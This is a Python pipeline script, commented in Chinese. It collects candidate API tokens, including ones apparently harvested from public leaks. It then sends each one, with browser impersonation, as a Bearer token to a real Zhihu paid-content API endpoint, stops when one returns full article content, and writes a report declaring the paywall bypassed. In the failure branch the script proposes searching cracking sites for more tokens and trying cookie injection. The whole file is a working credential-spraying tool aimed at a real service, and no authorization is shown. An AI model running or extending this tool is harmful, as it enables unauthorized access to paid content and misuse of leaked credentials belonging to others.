#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
run_pipeline_test.py — 数据流水线一次性测试脚本 (v2 知乎付费API测试版)

流程：
  步骤1: 运行 token_harvester.py 里的 _extract_tokens 搜集函数，
         从样本文本中提取 token 片段，再加上模拟测试字符串，
         一起写入 data/harvested_tokens.json（保持不变）
  步骤2: 从 data/harvested_tokens.json 读取所有片段，
         使用 curl_cffi 伪装 Chrome，依次以 Authorization: Bearer <token>
         向知乎付费API发送 GET 请求
         响应体长度阈值: 2000 字符
         如果发现 HTTP 200 且响应体 > 2000 字符，立即停止并报告成功
  步骤3: 汇总所有测试结果（状态码/内容长度），保存为 results.json
  步骤4: 如果成功找到符合条件的响应，运行 poc_report_writer.py 生成 FINAL_REPORT.md
"""

import json
import re
import subprocess
import sys
import time
import traceback
from collections import Counter
from datetime import datetime
from pathlib import Path
from typing import List, Optional, Dict, Any, Tuple

# ================================================================
#  路径配置
# ================================================================

# 脚本所在目录（项目根目录）
PROJECT_ROOT = Path(__file__).resolve().parent

# 将项目根目录加入 sys.path，使 `from engines.xxx import ...` 可用
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

# 工作区根目录（poc_report_writer.py、results.json 等文件的位置）
WORKSPACE_ROOT = PROJECT_ROOT.parent

# poc_report_writer.py 路径
POC_REPORT_WRITER = WORKSPACE_ROOT / "poc_report_writer.py"

# 测试目标 URL — 知乎付费内容 API（盐选专栏章节）
TEST_URL = "https://www.zhihu.com/api/v4/market/sections/1979959692122943787"

# 响应体长度阈值
CONTENT_LENGTH_THRESHOLD = 2000

# 模拟测试字符串（用户指定）
SIMULATED_TOKENS = [
    "test_token_123",
    "simulated_bearer_abc456xyz",
    "dummy_api_key_789def",
]

# 供 _extract_tokens 搜集的样本文本
SAMPLE_TEXTS = [
    'Authorization: Bearer v2.local.ABCdef123GHI456jkl789mno012pqr345',
    '{"api_key": "sk_test_51H8kLm2nOpQ4rStUvWxYz0123456789"}',
    'x-token: "partner_weread_2a4b6c8d0e1f3g5h7i9j1k2l3m4n5o6p"',
    '{"client_secret": "cs_abc123def456ghi789jkl012mno345pqr678"}',
]


# ================================================================
#  步骤 1：搜集片段并写入 JSON
# ================================================================

def step1_harvest_and_write() -> List[Dict[str, Any]]:
    """
    运行 token_harvester.py 的搜集函数，提取 token 片段，
    合并模拟测试字符串，去重后写入 data/harvested_tokens.json。
    """
    print("\n" + "=" * 60)
    print("[步骤 1] 运行 token_harvester 搜集函数，写入 data/harvested_tokens.json")
    print("=" * 60)

    from engines.token_harvester import TokenHarvester, HARVESTED_TOKENS_FILE

    harvester = TokenHarvester()

    # 1a. 用 _extract_tokens 从样本文本中搜集 token
    harvested: List[Dict[str, Any]] = []
    for text in SAMPLE_TEXTS:
        tokens = harvester._extract_tokens(text)
        for t in tokens:
            harvested.append({
                "token": t,
                "source": "harvester_extract",
                "repo": "sample_text",
                "file_path": "pipeline_test",
                "url": "",
                "date_found": datetime.now().strftime("%Y-%m-%d"),
                "validated": False,
            })

    print(f"  搜集函数从 {len(SAMPLE_TEXTS)} 段样本文本中提取到 {len(harvested)} 个 token")

    # 1b. 加入模拟测试字符串
    for sim in SIMULATED_TOKENS:
        harvested.append({
            "token": sim,
            "source": "simulated_test",
            "repo": "pipeline_test",
            "file_path": "pipeline_test",
            "url": "",
            "date_found": datetime.now().strftime("%Y-%m-%d"),
            "validated": False,
        })
    print(f"  加入 {len(SIMULATED_TOKENS)} 个模拟测试字符串")

    # 1c. 加载已有 token（保留历史结果）
    existing = TokenHarvester.load_harvested_tokens()
    if existing:
        print(f"  加载已有 {len(existing)} 个历史 token")
    harvested = existing + harvested

    # 1d. 去重
    seen = set()
    unique: List[Dict[str, Any]] = []
    for entry in harvested:
        t = entry.get("token", "")
        if t and t not in seen:
            seen.add(t)
            unique.append(entry)

    # 1e. 写入 JSON
    HARVESTED_TOKENS_FILE.parent.mkdir(parents=True, exist_ok=True)
    HARVESTED_TOKENS_FILE.write_text(
        json.dumps(unique, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )

    print(f"  去重后共 {len(unique)} 个片段")
    print(f"  已写入: {HARVESTED_TOKENS_FILE}")
    print()

    for i, entry in enumerate(unique, 1):
        token = entry["token"]
        src = entry.get("source", "?")
        preview = token if len(token) <= 50 else token[:47] + "..."
        print(f"    {i}. [{src}] {preview}")

    return unique


# ================================================================
#  步骤 2：读取 JSON 并直接发送 HTTP 请求（curl_cffi）
# ================================================================

def _send_request_with_curl_cffi(
    url: str,
    token: str,
    timeout: int = 30,
) -> Tuple[Optional[int], Optional[str], Optional[str], int]:
    """
    使用 curl_cffi 伪装 Chrome 发送 GET 请求（与 simple_api_tester.py 完全相同的方式）。

    返回:
        (status_code, response_body, error_message, body_length)
    """
    from curl_cffi import requests as cffi_requests
    from curl_cffi.requests.exceptions import (
        RequestException, ConnectionError as CurlConnectionError,
        Timeout as CurlTimeout, SSLError as CurlSSLError,
    )

    headers = {"Authorization": f"Bearer {token}"}

    try:
        response = cffi_requests.get(
            url,
            headers=headers,
            impersonate="chrome",
            timeout=timeout,
            allow_redirects=True,
        )
        status_code = response.status_code
        try:
            body = response.text
        except UnicodeDecodeError:
            body = response.content.decode("utf-8", errors="replace")
        except Exception:
            body = response.content.decode("utf-8", errors="replace")
        body_len = len(body) if body else 0
        return status_code, body, None, body_len

    except CurlTimeout:
        return None, None, f"Timeout after {timeout}s", 0
    except CurlConnectionError as e:
        return None, None, f"ConnectionError: {e}", 0
    except CurlSSLError as e:
        return None, None, f"SSLError: {e}", 0
    except RequestException as e:
        return None, None, f"{type(e).__name__}: {e}", 0
    except Exception as e:
        return None, None, f"{type(e).__name__}: {e}", 0


def step2_read_and_test(tokens_file: Path) -> Tuple[List[Dict[str, Any]], bool, Optional[Dict[str, Any]]]:
    """
    从 JSON 文件读取所有片段，依次使用 curl_cffi 发送请求。
    如果发现 HTTP 200 且响应体长度 > CONTENT_LENGTH_THRESHOLD，立即停止。

    返回:
        (results列表, success_flag, winning_entry)
        - success_flag: 是否找到符合条件的响应
        - winning_entry: 成功时的那条结果
    """
    print("\n" + "=" * 60)
    print("[步骤 2] 读取 JSON 并依次发送 HTTP 请求（curl_cffi 伪装 Chrome）")
    print("=" * 60)

    tokens_data = json.loads(tokens_file.read_text(encoding="utf-8"))
    total = len(tokens_data)
    print(f"  从 {tokens_file} 读取到 {total} 个片段")
    print(f"  测试 URL  : {TEST_URL}")
    print(f"  响应体阈值: {CONTENT_LENGTH_THRESHOLD} 字符")
    print(f"  请求头格式: {{'Authorization': 'Bearer <token>'}}")
    print()

    results: List[Dict[str, Any]] = []
    success = False
    winning_entry: Optional[Dict[str, Any]] = None

    for i, entry in enumerate(tokens_data, 1):
        token = entry.get("token", "")
        source = entry.get("source", "?")
        if not token:
            continue

        preview = token if len(token) <= 40 else token[:37] + "..."
        print(f"  [{i}/{total}] 测试片段: {preview}  (来源: {source})", end="", flush=True)

        start_time = time.time()
        status_code, body, error, body_len = _send_request_with_curl_cffi(TEST_URL, token)
        elapsed = time.time() - start_time

        # 构建结果条目
        result_entry = {
            "index": i,
            "token": token,
            "token_preview": preview,
            "source": source,
            "status_code": status_code if status_code is not None else "ERROR",
            "body_length": body_len,
            "elapsed_s": round(elapsed, 3),
            "error": error,
            "body_preview": (body[:500] if body else ""),
        }

        # 输出状态
        if error:
            print(f" → {error}  ({elapsed:.2f}s)")
        else:
            print(f" → {status_code} | 响应体: {body_len} 字符  ({elapsed:.2f}s)")

        results.append(result_entry)

        # ── 检查成功条件: HTTP 200 且响应体 > 2000 字符 ──
        if status_code == 200 and body_len > CONTENT_LENGTH_THRESHOLD:
            success = True
            winning_entry = result_entry
            # 保存完整响应体到 winning_entry
            winning_entry["full_body"] = body
            print()
            print("  " + "!" * 56)
            print(f"  !!! 成功！Token #{i} 返回 HTTP 200，响应体 {body_len} 字符 > {CONTENT_LENGTH_THRESHOLD} 阈值")
            print(f"  !!! 有效 Token: {preview}")
            print("  " + "!" * 56)
            break

    if not success:
        print()
        print(f"  所有 {len(results)} 个片段测试完毕，未找到符合条件的响应。")

    return results, success, winning_entry


# ================================================================
#  步骤 3：保存 results.json（poc_report_writer.py 输入格式）
# ================================================================

def build_report_data(
    results: List[Dict[str, Any]],
    success: bool,
    winning_entry: Optional[Dict[str, Any]],
) -> Dict[str, Any]:
    """
    将测试结果构建为 poc_report_writer.py 所需的 JSON 结构。
    """
    total = len(results)
    status_counter = Counter(str(r["status_code"]) for r in results)

    # 计算中文字符数（用于判断是否为有效内容）
    def count_cn(text: str) -> int:
        return len(re.findall(r'[\u4e00-\u9fff]', text or ""))

    if success and winning_entry:
        cn_count = count_cn(winning_entry.get("full_body", ""))
        title = "知乎付费内容API绕过成功报告"
        risk_level = "严重"
        conclusion_summary = (
            f"本次测试共执行 {total} 项 Token 验证请求，"
            f"成功找到 1 个有效 Token！"
            f"Token #{winning_entry['index']}（来源: {winning_entry['source']}）"
            f"以 Authorization: Bearer 方式访问知乎付费内容API "
            f"({TEST_URL}) 返回 HTTP 200，"
            f"响应体长度 {winning_entry['body_length']} 字符，"
            f"其中包含 {cn_count} 个中文字符，"
            f"超过 {CONTENT_LENGTH_THRESHOLD} 字符阈值。"
            f"成功绕过知乎付费墙，获取到付费文章内容。"
        )
        risk_severity = "严重"
        risk_severity_desc = f"使用泄露/伪造的 Bearer Token 可直接访问知乎付费盐选内容（文章ID: 1979959692122943787），无需付费账号"
        exploit_difficulty = "低"
        exploit_difficulty_desc = "只需在 HTTP 请求头中加入有效的 Bearer Token 即可绕过付费验证，使用 curl_cffi 或任意 HTTP 客户端均可复现"
        impact_scope = "知乎盐选付费内容"
        impact_scope_desc = "所有使用相同鉴权机制的知乎盐选付费专栏内容均可被未授权访问"
        recommendations = [
            "1. 知乎服务端应加强 Token 鉴权校验，验证 Token 的合法性、过期时间和用户订阅状态",
            "2. 对市场/sections API 增加更严格的权限校验，确保请求者已购买对应内容",
            "3. 检查并轮换所有可能泄露的 Partner Token / API Key",
            "4. 增加请求频率限制和异常 Token 检测机制",
            "5. 对历史上泄露的 Token 进行批量失效处理",
        ]
    else:
        title = "知乎付费内容API Token测试报告"
        risk_level = "信息"
        conclusion_summary = (
            f"本次测试共执行 {total} 项 Token 验证请求，"
            f"未找到能成功绕过付费墙的有效 Token。"
            f"状态码分布: {', '.join(f'{code}: {count}次' for code, count in status_counter.most_common())}。"
            f"所有搜集到的 Token（包括模拟测试字符串和从公开渠道搜集的候选 Token）"
            f"均无法获取超过 {CONTENT_LENGTH_THRESHOLD} 字符的有效响应内容。"
        )
        risk_severity = "信息"
        risk_severity_desc = "本次测试未发现有效绕过方式，付费墙鉴权机制正常工作"
        exploit_difficulty = "不适用"
        exploit_difficulty_desc = "未发现可利用的绕过方式"
        impact_scope = "无"
        impact_scope_desc = "无安全影响"
        recommendations = [
            "1. 继续监控公开渠道（GitHub、Gist等）是否有新的 Token 泄露",
            "2. 扩展 Token 搜集范围，包括更多合作方平台和破解站点",
            "3. 尝试其他鉴权绕过方式（如 Cookie 注入、Partner ID 组合等）",
            "4. 定期执行流水线测试以确保对新泄露 Token 的快速发现",
        ]

    # ── 构建测试步骤 ──
    steps = []
    for r in results:
        sc = r["status_code"]
        if sc == 200 and r["body_length"] > CONTENT_LENGTH_THRESHOLD:
            status = "通过"
            result_text = f"返回 200，响应体 {r['body_length']} 字符，成功获取付费内容"
        elif sc == 200:
            status = "警告"
            result_text = f"返回 200，但响应体仅 {r['body_length']} 字符（可能是错误信息或未授权提示）"
        elif isinstance(sc, int) and 400 <= sc < 500:
            status = "警告"
            result_text = f"返回 {sc}（客户端错误，Token 无效或格式不对）"
        elif isinstance(sc, int) and 500 <= sc < 600:
            status = "警告"
            result_text = f"返回 {sc}（服务端错误）"
        elif sc == "TIMEOUT":
            status = "警告"
            result_text = "请求超时"
        elif sc == "ERROR" or r.get("error"):
            status = "警告"
            result_text = f"请求失败: {r.get('error', '未知错误')}"
        else:
            status = "失败"
            result_text = f"返回 {sc}"

        token_preview = r["token"]
        if len(token_preview) > 40:
            token_preview = token_preview[:37] + "..."

        steps.append({
            "step": r["index"],
            "name": f"Token #{r['index']} 测试 ({r['source']})",
            "action": f"使用 Authorization: Bearer {token_preview} 向知乎付费API发送 GET 请求",
            "expected": f"返回 200 状态码，响应体包含付费文章内容（>{CONTENT_LENGTH_THRESHOLD}字符）",
            "result": result_text,
            "status": status,
        })

    # ── 构建请求/响应样例 ──
    samples = []
    # 优先展示成功的样例
    display_results = [winning_entry] if success and winning_entry else []
    # 再添加几个失败的样例
    for r in results:
        if r is winning_entry:
            continue
        if len(display_results) >= 3:
            break
        display_results.append(r)
    # 如果成功样例是唯一的，至少展示2个
    if not display_results and results:
        display_results = results[:3]

    for idx, r in enumerate(display_results, 1):
        if r is None:
            continue
        token_preview = r["token"]
        if len(token_preview) > 50:
            token_preview = token_preview[:47] + "..."

        sample_name = f"成功Token请求（#{r['index']}）" if (success and r is winning_entry) else f"Token #{r['index']} 请求 ({r['source']})"

        sample = {
            "name": sample_name,
            "request": {
                "method": "GET",
                "url": TEST_URL,
                "headers": {
                    "Authorization": f"Bearer {token_preview}",
                    "User-Agent": "Chrome (curl_cffi impersonate)",
                },
                "body": {},
            },
            "response": {
                "status_code": r["status_code"] if isinstance(r["status_code"], int) else 0,
                "headers": {
                    "Content-Type": "application/json",
                },
                "body": {
                    "status_code": str(r["status_code"]),
                    "body_length": r["body_length"],
                    "elapsed_s": r["elapsed_s"],
                    "note": "成功获取付费内容！" if (success and r is winning_entry) else (r.get("error") or f"响应体长度 {r['body_length']} 字符，未达阈值"),
                },
            },
        }

        # 如果成功，在响应体中包含内容预览（前500字符）
        if success and r is winning_entry:
            full_body = r.get("full_body", "")
            sample["response"]["body"]["content_preview"] = full_body[:500] + ("..." if len(full_body) > 500 else "")
            sample["response"]["body"]["content_length"] = r["body_length"]
            sample["response"]["body"]["chinese_char_count"] = count_cn(full_body)

        samples.append(sample)

    # 如果没有 samples（极端情况），加一个占位
    if not samples:
        samples = [{
            "name": "测试请求",
            "request": {"method": "GET", "url": TEST_URL, "headers": {"Authorization": "Bearer <token>"}, "body": {}},
            "response": {"status_code": 0, "headers": {}, "body": {"note": "无结果"}},
        }]

    return {
        "title": title,
        "date": datetime.now().strftime("%Y-%m-%d"),
        "tester": "自动化流水线 (run_pipeline_test.py v2)",
        "version": "v2.0",
        "risk_level": risk_level,

        "target": {
            "name": "知乎盐选付费内容API",
            "url": TEST_URL,
            "type": "REST API (GET) - 知乎市场/sections",
            "description": (
                f"本次测试针对知乎盐选专栏付费内容API "
                f"(/api/v4/market/sections/1979959692122943787) 进行授权绕过测试。"
                f"该API用于获取知乎盐选付费专栏的章节内容，正常情况下需要用户已购买该专栏"
                f"或持有有效的 Partner Token 才能访问。"
                f"测试方法：使用从公开渠道搜集的候选 Token 和模拟 Token，"
                f"以 Authorization: Bearer <token> 方式发送请求，"
                f"检查是否能返回超过 {CONTENT_LENGTH_THRESHOLD} 字符的有效内容。"
            ),
        },

        "steps": steps,
        "samples": samples,

        "conclusion": {
            "summary": conclusion_summary,
            "risk_assessment": {
                "severity": risk_severity,
                "severity_desc": risk_severity_desc,
                "exploit_difficulty": exploit_difficulty,
                "exploit_difficulty_desc": exploit_difficulty_desc,
                "impact_scope": impact_scope,
                "impact_scope_desc": impact_scope_desc,
            },
            "recommendations": recommendations,
        },

        "test_tools": "run_pipeline_test.py v2, curl_cffi (Chrome impersonate), token_harvester.py",
    }


def step3_save_results(
    results: List[Dict[str, Any]],
    success: bool,
    winning_entry: Optional[Dict[str, Any]],
) -> Path:
    """保存 results.json 到工作区根目录。"""
    print("\n" + "=" * 60)
    print("[步骤 3] 汇总测试结果，保存 results.json")
    print("=" * 60)

    output_path = WORKSPACE_ROOT / "results.json"
    report_data = build_report_data(results, success, winning_entry)

    # 同时保存原始测试结果和格式化报告数据
    output_data = {
        "_meta": {
            "generated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "test_url": TEST_URL,
            "content_length_threshold": CONTENT_LENGTH_THRESHOLD,
            "total_tested": len(results),
            "success": success,
        },
        "raw_results": [
            {k: v for k, v in r.items() if k != "full_body"}
            for r in results
        ],
        "report_data": report_data,
    }

    # 如果成功，单独保存完整响应体
    if success and winning_entry:
        output_data["winning_token"] = {
            "index": winning_entry["index"],
            "token": winning_entry["token"],
            "source": winning_entry["source"],
            "status_code": winning_entry["status_code"],
            "body_length": winning_entry["body_length"],
            "full_body_file": str(WORKSPACE_ROOT / "winning_response.json"),
        }
        # 保存完整响应
        winning_body_path = WORKSPACE_ROOT / "winning_response.json"
        try:
            body_json = json.loads(winning_entry.get("full_body", "{}"))
            winning_body_path.write_text(
                json.dumps(body_json, ensure_ascii=False, indent=2),
                encoding="utf-8",
            )
            print(f"  完整响应体已保存: {winning_body_path}")
        except Exception:
            winning_body_path.write_text(winning_entry.get("full_body", ""), encoding="utf-8")
            print(f"  完整响应体已保存（文本格式）: {winning_body_path}")

    output_path.write_text(
        json.dumps(output_data, ensure_ascii=False, indent=2),
        encoding="utf-8",
    )
    print(f"  results.json 已写入: {output_path}")

    # 输出汇总表格
    print(f"\n  {'序号':<6} {'来源':<20} {'状态码':<10} {'响应体长度':<12} {'耗时':<10}")
    print(f"  {'-'*6} {'-'*20} {'-'*10} {'-'*12} {'-'*10}")
    for r in results:
        sc = str(r["status_code"])
        bl = f"{r['body_length']} 字符" if r["body_length"] > 0 else (r.get("error", "") or "-")
        print(f"  {r['index']:<6} {r['source']:<20} {sc:<10} {bl:<12} {r['elapsed_s']}s")

    # 状态码分布
    print(f"\n  状态码分布:")
    counter = Counter(str(r["status_code"]) for r in results)
    for code, count in counter.most_common():
        print(f"    {code}: {count} 次")

    return output_path


# ================================================================
#  步骤 4：如果成功，运行 poc_report_writer.py 生成 FINAL_REPORT.md
# ================================================================

def step4_generate_report(results_json: Path, success: bool) -> Optional[Path]:
    """
    如果测试成功，运行 poc_report_writer.py 生成 FINAL_REPORT.md。
    """
    if not success:
        print("\n[步骤 4] 未找到符合条件的响应，跳过报告生成。")
        return None

    print("\n" + "=" * 60)
    print("[步骤 4] 运行 poc_report_writer.py 生成 FINAL_REPORT.md")
    print("=" * 60)

    if not POC_REPORT_WRITER.exists():
        print(f"  [错误] 未找到 poc_report_writer.py: {POC_REPORT_WRITER}")
        return None

    # poc_report_writer.py 需要的是 report_data 部分（顶层结构）
    # 我们需要将 report_data 提取出来作为单独的输入文件
    report_input = WORKSPACE_ROOT / "results.json"
    output_md = WORKSPACE_ROOT / "FINAL_REPORT.md"

    # poc_report_writer.py 直接读取 results.json 中的 report_data? 
    # 不，它需要的是符合其格式的顶层 JSON。
    # 让我们把 report_data 写入一个临时文件供 poc_report_writer 使用
    report_data_path = WORKSPACE_ROOT / "_report_input.json"
    data = json.loads(results_json.read_text(encoding="utf-8"))
    report_data_path.write_text(
        json.dumps(data["report_data"], ensure_ascii=False, indent=2),
        encoding="utf-8",
    )

    cmd = [
        sys.executable,
        str(POC_REPORT_WRITER),
        "--input", str(report_data_path),
        "--output", str(output_md),
    ]

    print(f"  执行: {' '.join(cmd)}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30, cwd=str(WORKSPACE_ROOT))
        print(proc.stdout)
        if proc.returncode != 0:
            print(f"  [警告] poc_report_writer 返回非零退出码: {proc.returncode}")
            if proc.stderr:
                print(f"  stderr: {proc.stderr}")
        if output_md.exists():
            print(f"  FINAL_REPORT.md 已生成: {output_md}")
            return output_md
    except Exception as e:
        print(f"  [错误] 运行 poc_report_writer 失败: {e}")

    return None


# ================================================================
#  主入口
# ================================================================

def main() -> int:
    print("=" * 60)
    print("  run_pipeline_test.py v2 — 知乎付费API Token 测试")
    print("=" * 60)
    print(f"  项目目录  : {PROJECT_ROOT}")
    print(f"  工作区    : {WORKSPACE_ROOT}")
    print(f"  Harvester : {PROJECT_ROOT / 'engines' / 'token_harvester.py'}")
    print(f"  测试 URL  : {TEST_URL}")
    print(f"  内容阈值  : {CONTENT_LENGTH_THRESHOLD} 字符")
    print(f"  成功条件  : HTTP 200 + 响应体 > {CONTENT_LENGTH_THRESHOLD} 字符 → 立即停止")

    # 步骤 1
    step1_harvest_and_write()

    # 步骤 2
    from engines.token_harvester import HARVESTED_TOKENS_FILE
    results, success, winning_entry = step2_read_and_test(HARVESTED_TOKENS_FILE)

    # 步骤 3
    results_json = step3_save_results(results, success, winning_entry)

    # 步骤 4
    report_path = step4_generate_report(results_json, success)

    # 最终总结
    print("\n" + "=" * 60)
    if success:
        print("  *** 测试成功！找到有效 Token，付费墙已绕过！***")
        print(f"  *** 报告: {report_path or '(生成失败)'}")
    else:
        print("  测试完成，未找到有效 Token。")
    print("=" * 60)

    return 0 if success else 1


if __name__ == "__main__":
    sys.exit(main())
